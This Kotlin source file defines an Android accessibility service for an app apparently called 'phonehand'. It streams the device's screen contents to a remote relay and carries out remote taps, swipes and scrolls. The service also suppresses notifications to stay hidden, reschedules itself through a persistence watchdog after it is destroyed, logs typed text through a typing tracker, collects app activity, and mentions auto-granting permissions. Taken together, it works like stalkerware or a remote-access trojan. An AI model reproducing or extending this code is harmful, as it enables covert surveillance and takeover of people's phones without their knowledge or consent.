package com.phonehand.app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkRequest
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * Always-on relay over WiFi or mobile data (no USB, no same network).
 * Tree-only feed — no screenshots.
 */
class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {

    private val mainHandler = Handler(Looper.getMainLooper())
    private var relay: RelayClient? = null
    private var streaming = false
    private var lastTreeAt = 0L
    private var lastWindowPkg = ""
    private var lastActivityTitle = ""
    private var refreshGen = 0
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var lastNetworkRelayAt = 0L
    private var lastAuthRepairAt = 0L

    @Volatile var lastTreeJson: org.json.JSONObject? = null

    private val treeLoop = object : Runnable {
        override fun run() {
            if (!streaming) return
            pushTreeNow()
            mainHandler.postDelayed(this, treeIntervalMs())
        }
    }

    private val stateLoop = object : Runnable {
        override fun run() {
            if (RelayHub.relayConnected) DeviceStateReporter.send(this@TouchAccessibilityService)
            mainHandler.postDelayed(this, 3000)
        }
    }

    private fun treeIntervalMs(): Long =
        if (RelayHub.peerBrowserConnected) TREE_MS_LIVE else TREE_MS_IDLE

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        InputHandler.service = this
        StealthNotifications.suppressAll(this)
        PersistenceWatchdog.schedule(this)
        val metrics = resources.displayMetrics
        RelayHub.screenWidth = metrics.widthPixels
        RelayHub.screenHeight = metrics.heightPixels
        registerNetworkWatcher()
        UserSession.setAccessibilityWasEnabled(this, true)
        runCatching { ensureRelay() }
    }

    override fun onDestroy() {
        ActivityCollector.get(this).stop()
        unregisterNetworkWatcher()
        relay?.disconnect()
        relay = null
        RelayHub.client = null
        RelayHub.live = false
        stopStreaming()
        if (InputHandler.service === this) InputHandler.service = null
        if (instance === this) instance = null
        if (UserSession.isSignedUp(this)) {
            PersistenceWatchdog.schedule(this)
        }
        super.onDestroy()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString().orEmpty()
                val actTitle = event.text?.joinToString(" ")?.trim().orEmpty()
                if (actTitle.isNotEmpty()) lastActivityTitle = actTitle
                if (pkg.isEmpty()) return
                if (!streaming) {
                    lastWindowPkg = pkg
                    return
                }
                if (pkg != lastWindowPkg) {
                    lastWindowPkg = pkg
                    TreeDiffer.reset()
                    mainHandler.post { pushTreeNow(forceFull = true) }
                } else {
                    lastWindowPkg = pkg
                    scheduleTreePush()
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                captureTextChange(event)
                if (streaming) scheduleTreePush()
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_SCROLLED,
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_SELECTED,
            AccessibilityEvent.TYPE_WINDOWS_CHANGED,
            -> if (streaming) scheduleTreePush()
        }
    }

    private fun captureTextChange(event: AccessibilityEvent) {
        TypingTracker.onTextChanged(this, event, lastWindowPkg)
    }

    override fun onInterrupt() {}

    fun ensureRelay() {
        RelayHub.live = true
        if (relay == null) {
            connectRelay()
        } else if (!relay!!.isConnected()) {
            relay?.connect()
        }
        if (!streaming) startStreaming()
    }

    fun reconnectRelay() {
        relay?.disconnect()
        relay = null
        RelayHub.client = null
        connectRelay()
    }

    private fun connectRelay() {
        if (!UserSession.isSignedUp(this)) return
        val email = UserSession.email(this)?.trim().orEmpty()
        if (email.isBlank()) return
        val secret = UserSession.deviceSecret(this)
            ?: runCatching { DeviceSecret.value(this) }.getOrElse { DeviceId.id(this) }
        TreeDiffer.reset()
        val id = DeviceId.id(this)
        val label = DeviceId.label(this)
        val model = android.os.Build.MODEL
        relay = RelayClient(this, id, secret, label, model, email, this).also { it.connect() }
    }

    private fun registerNetworkWatcher() {
        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val cb = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                mainHandler.post { debouncedEnsureRelay() }
            }
        }
        networkCallback = cb
        cm.registerNetworkCallback(NetworkRequest.Builder().build(), cb)
    }

    private fun unregisterNetworkWatcher() {
        val cb = networkCallback ?: return
        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        runCatching { cm.unregisterNetworkCallback(cb) }
        networkCallback = null
    }

    override fun onConnected(peerConnected: Boolean) {
        RelayHub.peerBrowserConnected = peerConnected
        RelayHub.client = relay
        relay?.sendMeta(RelayHub.screenWidth, RelayHub.screenHeight)
        relay?.sendMode("tree")
        if (peerConnected) ActivityCollector.get(this).start()
        if (!streaming) startStreaming()
        else pushTreeNow(forceFull = true)
    }

    override fun onPeerConnected() {
        RelayHub.peerBrowserConnected = true
        ActivityCollector.get(this).start()
        pushTreeNow(forceFull = true)
    }
    override fun onPeerDisconnected() {
        RelayHub.peerBrowserConnected = false
        ActivityCollector.get(this).stop()
    }
    override fun onReconnecting() {
        Log.d(TAG, "relay reconnecting…")
    }

    private fun debouncedEnsureRelay() {
        if (relay?.isConnected() == true) return
        val now = System.currentTimeMillis()
        if (now - lastNetworkRelayAt < 20_000) return
        lastNetworkRelayAt = now
        ensureRelay()
    }

    override fun onAuthRejected(reason: String) {
        Log.w(TAG, "relay auth rejected: $reason")
        val now = System.currentTimeMillis()
        if (now - lastAuthRepairAt < 60_000) return
        lastAuthRepairAt = now
        SessionRepair.resync(this) { ok ->
            if (ok) reconnectRelay()
        }
    }

    override fun onError(message: String) {
        Log.w(TAG, message)
    }
    override fun onCommand(json: String) = InputHandler.handle(this, json)

    fun startStreaming() {
        streaming = true
        TreeDiffer.reset()
        mainHandler.removeCallbacks(treeLoop)
        mainHandler.removeCallbacks(stateLoop)
        mainHandler.post(treeLoop)
        mainHandler.post(stateLoop)
        pushTreeNow(forceFull = true)
        DeviceStateReporter.send(this)
    }

    private fun stopStreaming() {
        streaming = false
        mainHandler.removeCallbacks(treeLoop)
        mainHandler.removeCallbacks(stateLoop)
        NodeRegistry.clear()
        TreeDiffer.reset()
    }

    fun scheduleTreePush() {
        val now = System.currentTimeMillis()
        val minGap = if (RelayHub.peerBrowserConnected) 25 else 40
        if (now - lastTreeAt < minGap) return
        mainHandler.post { pushTreeNow() }
    }

    /** Burst refresh after remote input — UI updates async after gestures. */
    fun scheduleRefreshesAfterInput(forceFull: Boolean = false) {
        val gen = ++refreshGen
        val delays = longArrayOf(30, 80, 150)
        for (d in delays) {
            mainHandler.postDelayed({
                if (gen != refreshGen) return@postDelayed
                pushTreeNow(forceFull = forceFull && d == delays.last())
            }, d)
        }
    }

    fun pushTreeNow(forceFull: Boolean = false) {
        if (!RelayHub.live) return
        try {
            val json = snapshotTree(forceFull) ?: return
            val out = TreeDiffer.diff(json) ?: return
            RelayHub.client?.sendJson(out)
            ActivityCollector.get(this).onTree(json, lastWindowPkg)
            lastTreeAt = System.currentTimeMillis()
        } catch (e: Exception) {
            Log.w(TAG, e.message ?: "tree")
        }
    }

    /** Export current UI tree (always, even when relay is off). Used by permission auto-grant. */
    fun snapshotTree(forceFull: Boolean = false): org.json.JSONObject? {
        return try {
            if (forceFull) TreeDiffer.reset()
            val result = UiTreeExporter.exportAll(
                this,
                RelayHub.screenWidth,
                RelayHub.screenHeight,
                lastActivityTitle,
            )
            NodeRegistry.update(result.nodesById)
            lastTreeJson = result.json
            result.json
        } catch (e: Exception) {
            Log.w(TAG, e.message ?: "snapshot")
            null
        }
    }

    fun clickById(id: String): Boolean {
        val path = NodeRegistry.pathsById[id]?.path ?: return false
        val root = rootInActiveWindow ?: return false
        val node = UiTreeExporter.findNodeByPath(root, path) ?: run {
            root.recycle()
            return false
        }
        root.recycle()
        val rect = Rect()
        node.getBoundsInScreen(rect)
        tap(rect.exactCenterX(), rect.exactCenterY())
        node.recycle()
        return true
    }

    fun tapAt(x: Float, y: Float) {
        tap(x, y)
    }

    fun tap(x: Float, y: Float) {
        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 50)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        val ok = dispatchGesture(
            gesture,
            object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription?) {
                    scheduleRefreshesAfterInput()
                }

                override fun onCancelled(gestureDescription: GestureDescription?) {
                    scheduleRefreshesAfterInput()
                }
            },
            mainHandler,
        )
        if (!ok) {
            Log.w(TAG, "tap dispatch rejected ($x,$y)")
            scheduleRefreshesAfterInput()
        }
    }

    fun swipe(x1: Float, y1: Float, x2: Float, y2: Float, durationMs: Long) {
        val path = Path().apply {
            moveTo(x1, y1)
            lineTo(x2, y2)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, durationMs.coerceIn(50, 800))
        dispatchGesture(
            GestureDescription.Builder().addStroke(stroke).build(),
            object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription?) {
                    scheduleRefreshesAfterInput()
                }

                override fun onCancelled(gestureDescription: GestureDescription?) {
                    scheduleRefreshesAfterInput()
                }
            },
            mainHandler,
        )
    }

    fun scrollAt(x: Float, y: Float, direction: String) {
        val root = rootInActiveWindow ?: return
        val node = findScrollableAt(root, x, y) ?: run { root.recycle(); return }
        root.recycle()
        val action = when (direction) {
            "up" -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
            "down" -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
            else -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
        }
        node.performAction(action)
        node.recycle()
        scheduleRefreshesAfterInput()
    }

    private fun findScrollableAt(node: AccessibilityNodeInfo, x: Float, y: Float): AccessibilityNodeInfo? {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        if (!rect.contains(x.toInt(), y.toInt())) return null

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findScrollableAt(child, x, y)
            child.recycle()
            if (found != null) return found
        }

        if (node.isScrollable) return AccessibilityNodeInfo.obtain(node)
        return null
    }

    fun globalAction(action: Int): Boolean = performGlobalAction(action)

    fun lastWindowPkg(): String = lastWindowPkg

    companion object {
        private const val TAG = "A11y"
        private const val TREE_MS_LIVE = 50L
        private const val TREE_MS_IDLE = 80L

        @Volatile var instance: TouchAccessibilityService? = null
    }
}
